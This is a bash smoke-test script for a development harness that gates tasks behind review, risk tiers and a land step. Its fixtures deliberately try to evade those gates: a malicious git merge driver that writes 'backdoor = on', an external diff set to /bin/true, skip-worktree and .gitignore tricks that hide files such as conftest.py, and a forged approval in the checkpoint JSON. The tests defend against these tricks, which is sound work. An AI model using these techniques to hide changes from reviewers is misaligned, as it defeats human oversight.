expect_refusal "a head that does not descend from the fork point" "no diff base" indir "$L5" "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record
L6="$SMOKE_TMP/l6"; mkdir -p "$L6/plans"; git init -q -b main "$L6.origin"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L6.origin/plans/k-plan.md" 2>/dev/null || { mkdir -p "$L6.origin/plans"; printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L6.origin/plans/k-plan.md"; }
git -C "$L6.origin" add -A; git -C "$L6.origin" commit -qm o; rm -rf "$L6"; git clone -q "$L6.origin" "$L6"
( cd "$L6" && APEX_BASE_BRANCH=origin/main APEX_GIBSON=0 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init with a remote-only base failed"
has "^TASK_BASE: [0-9a-f]\{40\}" "$(cd "$L6" && "$EX/iterate.sh" plans/k-plan.md 2>&1)" || fail "a run with a remote-only base has no diff base"
L7="$SMOKE_TMP/l7"; mkdir -p "$L7/plans"; git init -q -b main "$L7"
printf 'test:\n\t@test "$$GIT_CONFIG_COUNT" = 1\n' >"$L7/Makefile"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$L7/plans/k-plan.md"; git -C "$L7" add -A; git -C "$L7" commit -qm g
( cd "$L7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=apex.smoke GIT_CONFIG_VALUE_0=1 "$EX/init.sh" plans/k-plan.md >/dev/null 2>&1 ) || fail "init with env-supplied git config failed"
has "GATE_STEP: test PASS" "$(cd "$L7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=apex.smoke GIT_CONFIG_VALUE_0=1 "$EX/green-gate.sh" plans/k-plan.md check 2>&1)" \
  || fail "a gate command lost its env-supplied git config"
ok "classifier inputs: color config, large diffs; no-worktree feature branch, remote base, restart guard, env git config"

# 40. A trusted external diff cannot decide an exemption or the land boundary
#     (git 2.46+); control characters in paths cannot fuse into an allowlisted
#     word; many matching lines do not crash the classifier; a finished run
#     without a worktree does not block the next one.
M1="$SMOKE_TMP/m1"; mkdir -p "$M1/plans"; git init -q -b main "$M1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Gate 1→2** [gate:human] sign-off\n  - Acceptance: true\n' >"$M1/plans/m-plan.md"; git -C "$M1" add -A; git -C "$M1" commit -qm m
( cd "$M1" && APEX_GIBSON=0 "$EX/init.sh" plans/m-plan.md >/dev/null 2>&1 ) || fail "init for check 40 failed"
MW="$(st "$M1" plans/m-plan.md)/worktree"; echo doc >"$MW/notes.md"; git -C "$MW" add -A; git -C "$MW" commit -qm d
(cd "$M1" && "$EX/green-gate.sh" plans/m-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/m-plan.md 1 >/dev/null \
  && "$CP" plans/m-plan.md review 1 "$(git -C "$MW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/m-plan.md complete 1 ok >/dev/null 2>&1) || fail "check 40 task 1 could not complete"
mkdir -p "$MW/src/auth"; echo x >"$MW/src/auth/login.py"; git -C "$MW" add -A; git -C "$MW" commit -qm auth
git -C "$M1" config diff.external /bin/true; git -C "$M1" config diff.trustExitCode true
expect_refusal "a gate line with code under a trusted external diff" "no risk tier\|no independent review\|green" indir "$M1" "$CP" plans/m-plan.md complete 3 ok
git -C "$M1" config --unset diff.external; git -C "$M1" config --unset diff.trustExitCode
C1="$(mktemp -d "$SMOKE_TMP/c.XXXXXX")"; CW="$(mkrun "$C1")" || fail "init for check 40 failed"
printf 'def can_access(u): return True\n' >"$CW/$(printf '\a')ssociate.py"; git -C "$CW" add -A; git -C "$CW" commit -qm c
has "^TIER: C" "$(cd "$C1" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record)" || fail "a control character fused a path word into an allowlisted one"
C2="$(mktemp -d "$SMOKE_TMP/c.XXXXXX")"; CW="$(mkrun "$C2")" || fail "init for check 40 failed"
seq 1 50000 | sed 's/^/price = /' >"$CW/prices.txt"; git -C "$CW" add -A; git -C "$CW" commit -qm p
out="$(cd "$C2" && "$EX/risk-tier.sh" plans/k-plan.md 1 --no-record 2>&1)" || fail "risk-tier failed on a diff with many matching lines"
has "^TIER: C" "$out" || fail "a diff with many matching lines was not Tier C"
F1="$SMOKE_TMP/f1"; mkdir -p "$F1/plans"; git init -q -b main "$F1"; printf '.dev-plan-state/\n' >"$F1/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F1/plans/a-plan.md"; git -C "$F1" add -A; git -C "$F1" commit -qm a
( cd "$F1" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for check 40 failed"
echo doc >"$F1/notes.md"; git -C "$F1" add notes.md; git -C "$F1" commit -qm d
(cd "$F1" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F1" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the finished-run fixture could not complete"
git -C "$F1" add -A; git -C "$F1" commit -qm tick
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F1/plans/b-plan.md"; echo more >>"$F1/notes.md"; git -C "$F1" add -A; git -C "$F1" commit -qm b
( cd "$F1" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "a finished no-worktree run blocked the next run"
# "Finished" is derived when the guard runs: a reopened plan, or a last task
# completed with the harness off, keeps the guard on; so does a restart in
# worktree mode.
F4="$SMOKE_TMP/f4"; mkdir -p "$F4/plans"; git init -q -b main "$F4"; printf '.dev-plan-state/\n' >"$F4/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F4/plans/a-plan.md"; git -C "$F4" add -A; git -C "$F4" commit -qm a
( cd "$F4" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the reopen test failed"
echo doc >"$F4/notes.md"; git -C "$F4" add notes.md; git -C "$F4" commit -qm d
(cd "$F4" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F4" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the reopen fixture could not finish"
printf -- '- [ ] **Phase 1.2** [backend] c\n  - Acceptance: true\n' >>"$F4/plans/a-plan.md"
mkdir -p "$F4/src/auth"; echo 'import stripe' >"$F4/src/auth/login.py"; git -C "$F4" add -A; git -C "$F4" commit -qm reopen
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F4/plans/b-plan.md"; git -C "$F4" add -A; git -C "$F4" commit -qm b
expect_refusal "a new run after a finished plan was reopened" "below the new run's fork point" indir "$F4" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md
F2="$SMOKE_TMP/f2"; mkdir -p "$F2/plans"; git init -q -b main "$F2"; printf '.dev-plan-state/\n' >"$F2/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F2/plans/a-plan.md"; git -C "$F2" add -A; git -C "$F2" commit -qm a
( cd "$F2" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the harness-off test failed"
mkdir -p "$F2/src/auth"; echo 'import stripe' >"$F2/src/auth/login.py"; git -C "$F2" add -A; git -C "$F2" commit -qm x
(cd "$F2" && APEX_GIBSON=0 "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "APEX_GIBSON=0 complete failed"
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F2/plans/b-plan.md"; git -C "$F2" add -A; git -C "$F2" commit -qm b
expect_refusal "a new run after a last task completed with the harness off" "below the new run's fork point" indir "$F2" APEX_NO_WORKTREE=1 "$EX/init.sh" plans/b-plan.md
F3="$SMOKE_TMP/f3"; mkdir -p "$F3/plans"; git init -q -b main "$F3"; printf '.dev-plan-state/\n' >"$F3/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F3/plans/a-plan.md"; git -C "$F3" add -A; git -C "$F3" commit -qm a
( cd "$F3" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the mode-switch test failed"
mkdir -p "$F3/src/auth"; echo 'import stripe' >"$F3/src/auth/login.py"; git -C "$F3" add -A; git -C "$F3" commit -qm x
expect_refusal "a restart in worktree mode over unreviewed commits" "below the new run's fork point" indir "$F3" APEX_INIT_FORCE=1 "$EX/init.sh" plans/a-plan.md
# Only a reviewed completion retires a run: a box ticked by hand does not.
F5="$SMOKE_TMP/f5"; mkdir -p "$F5/plans"; git init -q -b main "$F5"; printf '.dev-plan-state/\n' >"$F5/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [backend] b\n  - Acceptance: true\n' >"$F5/plans/a-plan.md"; git -C "$F5" add -A; git -C "$F5" commit -qm a
( cd "$F5" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the hand-tick test failed"
echo doc >"$F5/notes.md"; git -C "$F5" add notes.md; git -C "$F5" commit -qm d
(cd "$F5" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F5" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the hand-tick fixture task 1 could not complete"
git -C "$F5" add -A; git -C "$F5" commit -qm tick; (cd "$F5" && "$EX/iterate.sh" plans/a-plan.md >/dev/null 2>&1) || true
mkdir -p "$F5/src/auth"; echo 'import stripe' >"$F5/src/auth/login.py"; git -C "$F5" add src; git -C "$F5" commit -qm x
sed -i.bak 's/^- \[ \] \*\*Phase 1.2/- [x] **Phase 1.2/' "$F5/plans/a-plan.md" && rm -f "$F5/plans/a-plan.md.bak"
expect_refusal "a restart after a box ticked by hand" "below the new run's fork point" indir "$F5" APEX_NO_WORKTREE=1 APEX_INIT_FORCE=1 "$EX/init.sh" plans/a-plan.md
# A properly finished run whose plan was archived does not block the next run.
F6="$SMOKE_TMP/f6"; mkdir -p "$F6/plans"; git init -q -b main "$F6"; printf '.dev-plan-state/\n' >"$F6/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F6/plans/a-plan.md"; git -C "$F6" add -A; git -C "$F6" commit -qm a
( cd "$F6" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the archive test failed"
echo doc >"$F6/notes.md"; git -C "$F6" add notes.md; git -C "$F6" commit -qm d
(cd "$F6" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null \
  && "$CP" plans/a-plan.md review 1 "$(git -C "$F6" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/a-plan.md complete 1 ok >/dev/null 2>&1) || fail "the archive fixture could not finish"
git -C "$F6" add -A; git -C "$F6" commit -qm tick; mkdir -p "$F6/plans/done"; git -C "$F6" mv plans/a-plan.md plans/done/a-plan.md; echo more >>"$F6/notes.md"; git -C "$F6" add -A; git -C "$F6" commit -qm archive
printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F6/plans/b-plan.md"; git -C "$F6" add -A; git -C "$F6" commit -qm b
( cd "$F6" && "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "a finished run with an archived plan blocked the next run"
# A run without a worktree completes only on its own branch; a live run's
# worktree branch is never another run's base.
F7="$SMOKE_TMP/f7"; mkdir -p "$F7/plans"; git init -q -b main "$F7"; printf '.dev-plan-state/\n' >"$F7/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F7/plans/a-plan.md"; git -C "$F7" add -A; git -C "$F7" commit -qm a
( cd "$F7" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "no-worktree init for the branch test failed"
mkdir -p "$F7/src/auth"; echo 'import stripe' >"$F7/src/auth/login.py"; git -C "$F7" add src; git -C "$F7" commit -qm x
git -C "$F7" checkout -qb side HEAD~1; echo doc >"$F7/notes.md"; git -C "$F7" add notes.md; git -C "$F7" commit -qm d
(cd "$F7" && "$EX/green-gate.sh" plans/a-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/a-plan.md 1 >/dev/null; "$CP" plans/a-plan.md review 1 "$(git -C "$F7" rev-parse HEAD)" APPROVE >/dev/null) || true
expect_refusal "a no-worktree completion on another branch" "complete it on its own branch" indir "$F7" "$CP" plans/a-plan.md complete 1 ok
F8="$SMOKE_TMP/f8"; mkdir -p "$F8/plans"; git init -q -b main "$F8"; printf '.dev-plan-state/\n' >"$F8/.gitignore"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$F8/plans/a-plan.md"; printf -- '- [ ] **Phase 1.1** [docs] b\n  - Acceptance: true\n' >"$F8/plans/b-plan.md"
git -C "$F8" add -A; git -C "$F8" commit -qm ab
( cd "$F8" && "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 ) || fail "init for the base-branch test failed"
F8B="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$(st "$F8" plans/a-plan.md)/checkpoint.json")"
expect_refusal "a base branch that is another live run's worktree branch" "worktree branch of another run" indir "$F8" APEX_BASE_BRANCH="$F8B" "$EX/init.sh" plans/b-plan.md
ok "trusted external diff, control-character paths, many matches, finished/reopened/harness-off/hand-ticked no-worktree runs, archived plans, mode switch, run branch, live-run base"

# 41. Per-run integrity at the exits: land builds the landed tree from the
#     reviewed head plus the base's own changes, never with merge machinery —
#     an -s ours merge cannot revert base changes, a path changed on both
#     sides to different entries is refused until the run reforks onto the
#     current base and re-reviews, merge drivers never run; the gate refuses a
#     working tree that is not its head.
oursrun() { # oursrun DIR MODE — MODE: ours | normal | ours-touch | refork | driver; prints land's output
  local d="$1" how="$2" w; mkdir -p "$d/plans"; git init -q -b main "$d"
  printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n' >"$d/plans/o-plan.md"
  printf 'max_items = 5\n1\n2\n3\nnote = a\n' >"$d/limits.txt"; git -C "$d" add -A; git -C "$d" commit -qm o
  ( cd "$d" && "$EX/init.sh" plans/o-plan.md >/dev/null 2>&1 ) || { echo "init-failed"; return 0; }
  w="$(st "$d" plans/o-plan.md)/worktree"
  done_task() { # done_task LINE
    (cd "$d" && "$EX/green-gate.sh" plans/o-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/o-plan.md "$1" >/dev/null \
      && "$CP" plans/o-plan.md review "$1" "$(git -C "$w" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/o-plan.md complete "$1" ok >/dev/null 2>&1)
  }
  if [ "$how" = ours-touch ] || [ "$how" = refork ]; then printf 'max_items = 5\n1\n2\n3\nnote = b\n' >"$w/limits.txt"; else echo a >"$w/a.md"; fi
  git -C "$w" add -A; git -C "$w" commit -qm a; done_task 1 || { echo "task1-failed"; return 0; }
  git -C "$d" add plans/o-plan.md; git -C "$d" commit -qm tick1
  printf 'max_items = 9\n1\n2\n3\nnote = a\n' >"$d/limits.txt"; git -C "$d" commit -qam fix
  if [ "$how" = driver ]; then
    git -C "$d" config merge.evil.driver "printf 'backdoor = on\n' > %A"; echo '* merge=evil' >>"$d/.git/info/attributes"
  fi
  case "$how" in
    ours|ours-touch) git -C "$w" merge -q -s ours -m sync main ;;
    normal|refork) git -C "$w" merge -q -m sync main ;;
  esac
  [ "$how" = refork ] && { (cd "$d" && "$CP" plans/o-plan.md refork "base moved under limits.txt" >/dev/null 2>&1) || { echo "refork-failed"; return 0; }; }
  echo b >"$w/b.md"; git -C "$w" add -A; git -C "$w" commit -qm b; done_task 3 || { echo "task2-failed"; return 0; }
  git -C "$d" add plans/o-plan.md; git -C "$d" commit -qm tick2
  local rc=0; (cd "$d" && "$EX/land.sh" plans/o-plan.md 2>&1 | grep -v '^\[land\]' ; exit "${PIPESTATUS[0]}") || rc=$?; echo "land-rc=$rc"
}
O1="$(oursrun "$SMOKE_TMP/o1" ours)"
has "merged main since its fork point" "$O1" && ! has "land-rc=0" "$O1" && grep -q 'max_items = 9' "$SMOKE_TMP/o1/limits.txt" \
  || fail "a run branch that merged the base (-s ours) landed without a refork: $(printf '%s' "$O1" | tail -2)"
O2="$(oursrun "$SMOKE_TMP/o2" normal)"
has "merged main since its fork point" "$O2" && ! has "land-rc=0" "$O2" || fail "a run branch that merged the base landed without a refork: $(printf '%s' "$O2" | tail -2)"
O3="$(oursrun "$SMOKE_TMP/o3" ours-touch)"
! has "land-rc=0" "$O3" || fail "an -s ours merge plus an edit to the same file landed: $(printf '%s' "$O3" | tail -2)"
O4="$(oursrun "$SMOKE_TMP/o4" refork)"
has "land-rc=0" "$O4" && grep -q 'max_items = 9' "$SMOKE_TMP/o4/limits.txt" && grep -q 'note = b' "$SMOKE_TMP/o4/limits.txt" \
  || fail "a reforked, re-reviewed run did not land both sides: $(printf '%s' "$O4" | tail -2)"
O5="$(oursrun "$SMOKE_TMP/o5" driver)"
has "land-rc=0" "$O5" && ! grep -rq backdoor "$SMOKE_TMP/o5" --include='*.txt' --include='*.md' || fail "a merge driver touched the landed tree: $(printf '%s' "$O5" | tail -2)"
# A refork starts a new review epoch: the approval of the narrower diff no longer counts.
O6="$SMOKE_TMP/o6"; oursrun "$O6" ours >/dev/null
git -C "$(st "$O6" plans/o-plan.md)/worktree" merge -q -s ours -m resync main
(cd "$O6" && "$CP" plans/o-plan.md refork "base moved" >/dev/null 2>&1) || fail "refork after an -s ours merge failed"
expect_refusal "a completion after refork that reuses the pre-refork review" "no risk tier\|no independent review" indir "$O6" "$CP" plans/o-plan.md complete 3 ok
# ...and neither does a G12 approval given before the refork.
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); h=sys.argv[2]
s.setdefault("approvals",{})["3"]={"gate":"G12","sha":h,"epoch":s.get("epoch",0)-1,"phrase":"pre-refork","at":"x"}
s.setdefault("tiers",{})["3"]={"tier":"C","since":"","head":h,"epoch":s.get("epoch",0)}; json.dump(s,open(p,"w"))' \
  "$(st "$O6" plans/o-plan.md)/checkpoint.json" "$(git -C "$(st "$O6" plans/o-plan.md)/worktree" rev-parse HEAD)"
expect_refusal "a Tier C completion after refork that reuses the pre-refork G12" "G12) for this exact head SHA in this epoch" indir "$O6" "$CP" plans/o-plan.md complete 3 ok
# A base submodule bump survives land even when .gitmodules says ignore = all.
U1="$SMOKE_TMP/u1"; mkdir -p "$U1/plans" "$U1/s"; git init -q -b main "$U1"
UA="$(git -C "$U1" commit-tree "$(git -C "$U1" mktree </dev/null)" -m a)"; UB="$(git -C "$U1" commit-tree "$(git -C "$U1" mktree </dev/null)" -p "$UA" -m b)"
printf '[submodule "s"]\n\tpath = s\n\turl = ./s.git\n\tignore = all\n' >"$U1/.gitmodules"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$U1/plans/u-plan.md"; git -C "$U1" add .gitmodules plans
git -C "$U1" update-index --add --cacheinfo "160000,$UA,s"; git -C "$U1" commit -qm u
( cd "$U1" && "$EX/init.sh" plans/u-plan.md >/dev/null 2>&1 ) || fail "init for the submodule test failed"
UW="$(st "$U1" plans/u-plan.md)/worktree"; echo a >"$UW/a.md"; git -C "$UW" add a.md; git -C "$UW" commit -qm a
(cd "$U1" && "$EX/green-gate.sh" plans/u-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/u-plan.md 1 >/dev/null \
  && "$CP" plans/u-plan.md review 1 "$(git -C "$UW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/u-plan.md complete 1 ok >/dev/null 2>&1) || fail "the submodule fixture task could not complete"
git -C "$U1" add plans/u-plan.md; git -C "$U1" commit -qm tick; git -C "$U1" update-index --cacheinfo "160000,$UB,s"; git -C "$U1" commit -qm bump
(cd "$U1" && "$EX/land.sh" plans/u-plan.md >/dev/null 2>&1) && [ "$(git -C "$U1" rev-parse HEAD:s)" = "$UB" ] \
  || fail "land reverted a base submodule bump hidden by submodule ignore = all"
# land re-run after the teardown failed (a locked worktree) finishes instead of refusing.
L1="$SMOKE_TMP/l1"; mkdir -p "$L1/plans"; git init -q -b main "$L1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$L1/plans/l-plan.md"; git -C "$L1" add -A; git -C "$L1" commit -qm l
( cd "$L1" && "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land re-run test failed"
LW="$(st "$L1" plans/l-plan.md)/worktree"; echo a >"$LW/a.md"; git -C "$LW" add a.md; git -C "$LW" commit -qm a
(cd "$L1" && "$EX/green-gate.sh" plans/l-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/l-plan.md 1 >/dev/null \
  && "$CP" plans/l-plan.md review 1 "$(git -C "$LW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/l-plan.md complete 1 ok >/dev/null 2>&1) || fail "the land re-run fixture task could not complete"
git -C "$L1" add plans/l-plan.md; git -C "$L1" commit -qm tick; git -C "$L1" worktree lock "$LW"
expect_refusal "a land whose worktree is locked" "could not remove the worktree" indir "$L1" "$EX/land.sh" plans/l-plan.md
git -C "$L1" worktree unlock "$LW"
(cd "$L1" && "$EX/land.sh" plans/l-plan.md >/dev/null 2>&1) && [ ! -d "$LW" ] && [ -f "$L1/a.md" ] \
  && [ "$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1])).get("landed"))' "$(st "$L1" plans/l-plan.md)/checkpoint.json")" = True ] \
  || fail "re-running land after an unlocked worktree did not finish the teardown"
# Disjoint changes land whatever their number or names; a path with a newline changed on both sides is refused.
D1="$SMOKE_TMP/d1"; mkdir -p "$D1/plans"; git init -q -b main "$D1"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n' >"$D1/plans/d-plan.md"; printf 'x\n' >"$D1/$(printf 'a\nb.txt')"; git -C "$D1" add -A; git -C "$D1" commit -qm d
( cd "$D1" && "$EX/init.sh" plans/d-plan.md >/dev/null 2>&1 ) || fail "init for the disjoint test failed"
DW="$(st "$D1" plans/d-plan.md)/worktree"; echo r >"$DW/$(printf 'a\nb.txt')"; git -C "$DW" commit -qam r
(cd "$D1" && "$EX/green-gate.sh" plans/d-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/d-plan.md 1 >/dev/null \
  && "$CP" plans/d-plan.md review 1 "$(git -C "$DW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/d-plan.md complete 1 ok >/dev/null 2>&1) || fail "the disjoint fixture task could not complete"
git -C "$D1" add plans/d-plan.md; git -C "$D1" commit -qm tick
echo b >"$D1/$(printf 'a\nb.txt')"; git -C "$D1" commit -qam base-edit
expect_refusal "a newline path changed on both sides" "changed on both sides" indir "$D1" "$EX/land.sh" plans/d-plan.md
git -C "$D1" reset -q --hard HEAD~1; mkdir -p "$D1/vendor"; for i in $(seq 1 3000); do echo "$i" >"$D1/vendor/f$i.txt"; done
git -C "$D1" add vendor; git -C "$D1" commit -qm vendor
(cd "$D1" && "$EX/land.sh" plans/d-plan.md >/dev/null 2>&1) && [ -f "$D1/vendor/f3000.txt" ] && [ "$(cat "$D1/$(printf 'a\nb.txt')")" = r ] \
  || fail "a run did not land beside 3000 disjoint base changes"
G1="$SMOKE_TMP/g1"; mkdir -p "$G1/plans"; git init -q -b main "$G1"
printf 'test:\n\t@grep -q GOOD impl.txt\n' >"$G1/Makefile"; echo GOOD >"$G1/impl.txt"; printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n' >"$G1/plans/g-plan.md"
git -C "$G1" add -A; git -C "$G1" commit -qm g
( cd "$G1" && "$EX/init.sh" plans/g-plan.md >/dev/null 2>&1 ) || fail "init for the gate test failed"
GW="$(st "$G1" plans/g-plan.md)/worktree"; echo BAD >"$GW/impl.txt"; git -C "$GW" commit -qam bad
echo GOOD >"$GW/impl.txt"; git -C "$GW" update-index --skip-worktree impl.txt
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate passed a head whose failing file was hidden by skip-worktree"
git -C "$GW" update-index --no-skip-worktree impl.txt; git -C "$GW" checkout -q impl.txt; git -C "$GW" config status.showUntrackedFiles no; echo x >"$GW/extra.txt"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored an untracked file hidden by status.showUntrackedFiles=no"
git -C "$GW" config --unset status.showUntrackedFiles
mkdir -p "$(git -C "$GW" rev-parse --git-common-dir)/info"; echo extra.txt >>"$(git -C "$GW" rev-parse --git-common-dir)/info/exclude"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored an untracked file hidden by .git/info/exclude"
: >"$(git -C "$GW" rev-parse --git-common-dir)/info/exclude"; printf '*\n' >"$GW/.gitignore"
has "GATE: FAIL" "$(cd "$G1" && "$EX/green-gate.sh" plans/g-plan.md check 2>&1)" || fail "the gate ignored untracked files hidden by an untracked .gitignore"
rm -f "$GW/.gitignore"
printf '.*\n!/.gitignore\n.cache/\n' >"$GW/.gitignore"; git -C "$GW" add .gitignore; git -C "$GW" commit -qm ignore-cache; mkdir -p "$GW/.cache"; printf '*\n' >"$GW/.cache/.gitignore"
! has ".cache" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate counted a tool cache's .gitignore that a committed .gitignore ignores"
mkdir -p "$GW/lib"; printf 'evil.py\n' >"$GW/lib/.gitignore"; echo x >"$GW/lib/evil.py"
has "lib/evil.py" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate missed an untracked .gitignore whose name (not directory) a committed '.*' rule ignores"
rm -rf "$GW/lib"
printf 'build\n' >>"$GW/.gitignore"; git -C "$GW" commit -qam ignore-build; mkdir -p "$GW/:build"; printf '*\n' >"$GW/:build/.gitignore"; echo x >"$GW/:build/t.py"
has ":build/.gitignore" "$(source "$EX/_lib.sh"; apex_dirty "$GW")" || fail "the gate trusted an untracked .gitignore in a directory whose name is pathspec magic (:build)"
rm -rf "$GW/:build"
# Submodules: files in one that is not checked out, and files hidden by a
# populated one's untracked .gitignore, are differences from the head.
SM="$SMOKE_TMP/sm"; mkdir -p "$SM"; git init -q -b main "$SM"; echo r >"$SM/r.txt"
git init -q -b main "$SM/sub"; echo s >"$SM/sub/s.txt"; git -C "$SM/sub" add -A; git -C "$SM/sub" commit -qm s
git -C "$SM" add r.txt 2>/dev/null; git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),sub"
git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),empty"; git -C "$SM" commit -qm sm >/dev/null 2>&1
mkdir -p "$SM/empty"   # what a checkout leaves for a submodule it does not check out
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "a clean repository with submodules was reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
printf '*\n' >"$SM/sub/.gitignore"; echo x >"$SM/sub/conftest.py"
has "submodule sub: not in the head: .*conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files hidden by an untracked .gitignore in a populated submodule"
rm -f "$SM/sub/.gitignore" "$SM/sub/conftest.py"; echo x >"$SM/empty/conftest.py"
has "submodule directory that is not checked out: empty" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed files in a submodule directory that is not checked out"
rm -f "$SM/empty/conftest.py"
# A submodule path that is not plain text to a program (a|b) is still checked.
git -C "$SM" update-index --add --cacheinfo "160000,$(git -C "$SM/sub" rev-parse HEAD),a|b"; git -C "$SM" commit -qm ab >/dev/null 2>&1
git clone -q "$SM/sub" "$SM/a|b" 2>/dev/null; printf '*\n' >"$SM/a|b/.gitignore"; echo x >"$SM/a|b/conftest.py"
has "submodule a|b: not in the head: .*conftest.py" "$(source "$EX/_lib.sh"; apex_dirty "$SM")" || fail "the gate missed a hidden file in a submodule whose path contains |"
rm -f "$SM/a|b/.gitignore" "$SM/a|b/conftest.py"
[ -z "$(source "$EX/_lib.sh"; apex_dirty "$SM")" ] || fail "clean submodules (including a|b) were reported dirty: $(source "$EX/_lib.sh"; apex_dirty "$SM")"
# A directory this user cannot list hides its files from git, not from the tests.
asuser() { if [ "$(id -u)" != 0 ]; then "$@"; elif command -v setpriv >/dev/null; then setpriv --bounding-set=-dac_override,-dac_read_search "$@"; else echo "no-setpriv"; fi; }
mkdir -p "$SM/zz"; echo x >"$SM/zz/conftest.py"; chmod 311 "$SM/zz"
ZZ="$(asuser bash -c 'source "$1/_lib.sh"; apex_dirty "$2"' _ "$EX" "$SM")"
